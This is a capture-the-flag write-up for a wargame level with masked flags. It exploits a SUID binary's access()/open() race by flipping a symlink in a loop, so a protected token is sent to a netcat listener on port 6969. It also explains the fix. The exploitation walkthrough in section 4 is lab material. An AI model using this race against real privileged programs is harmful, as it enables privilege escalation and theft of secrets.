# Level 10

## 1. Target Information
- **User:** `level10`
- **Password:** `***FLAG09***`
- **Target:** `flag10`
- **SSH Port:** `4242`

---

## 2. Reconnaissance & Discovery
Look at the home directory and run the binary with no arguments:

```bash
ls -la
./level10
# ./level10 file host
#   Sends file to host if you have access to it
```

**Findings:**
- A SUID executable `level10` owned by `flag10`, and a `token` file readable only by `flag10`:
```text
-rwsr-sr-x+ 1 flag10 level10 ... level10
-rw-------  1 flag10 flag10  ... token
```
- The usage (`level10 file host`) says it sends a file to a host **if you have access to it** — so there is a permission check before the send.

### Tracing the logic with ltrace
```bash
ltrace ./level10 /etc/passwd 127.0.0.1
```
```text
access("/etc/passwd", 4)                    = 0
...
open("/etc/passwd", 0, 0666)                = 3
...
connect(3, ...)                             # to host on port 6969
read(...) / write(...)                      # file contents sent out
```
Reconstructed behavior:
- `access(file, R_OK)` — gate the request on whether the **real** user (level10) can read the file.
- `open(file)` + read + send the bytes to `host` on hardcoded TCP port **6969**, acting as the **effective** user (flag10).

So it is a "send any file I can read to a host" primitive — and the read happens with flag10's privileges.

---

## 3. Vulnerability Analysis
- **Flaw Type:** TOCTOU (time-of-check-to-use) race — the security check and the use act on a **re-resolved path name**, not on the same object.
- **Technical Explanation:**
  - `access()` deliberately uses the **real** uid (level10) to answer "could the user read this?". `open()` then runs with the **effective** uid (flag10). The two syscalls use different identities.
  - Critically, `access()` and `open()` each resolve the **path string** independently. Nothing ties the file `access()` judged to the file `open()` later grabs — the name is looked up twice, and between the two lookups the name can be made to point somewhere else.
  - `/tmp/x` is a symlink we control. If it points at a file we own during `access()` (check passes), then at `~/token` during `open()` (read as flag10), the binary sends the token to our listener.
  - We can't time the window, so we **race**: flip the symlink target in a tight loop while firing the binary in a tight loop. Eventually `access()` and `open()` sample opposite targets and the token leaks.
  - **Root cause / fix:** never check a name and then re-open it. Either drop privileges to the real user before `open()` so the kernel enforces permissions atomically, or `open()` once and validate the resulting **fd** with `fstat` (plus `O_NOFOLLOW`). A name is not a stable reference to a file.

---

## 4. Exploitation Walkthrough

### Step 1: Start a listener (on the host, or a second VM terminal)
```bash
nc -lnvp 6969
```
Port 6969 is hardcoded in the binary, so the listener must use it.

### Step 2: Run the race
Send the helper [`race.sh`](race.sh) to the VM (home dir isn't writable, so use /tmp):
```bash
scp -P 4242 race.sh level10@<VM_IP>:/tmp/race.sh   # from the host
```
On the VM, point it at wherever the listener is reachable:
```bash
sh /tmp/race.sh <LISTENER_IP>
```
The script runs two loops: one flips `/tmp/x` between a readable bait file and `~/token`, the other fires `./level10 /tmp/x <IP>` repeatedly. When the race lands, the listener prints the token instead of the bait.

```text
# listener output when the race wins:
***PASS_FLAG10***
```

### Step 3: Become flag10 and grab the flag
```bash
su flag10
# Password: ***PASS_FLAG10***
getflag
# Check flag.Here is your token: ***FLAG10***
```

---

## 5. Flag
```text
Check flag.Here is your token: ***FLAG10***
```
- **Next Level User:** `level11`
- **Password for next level:** `***FLAG10***`
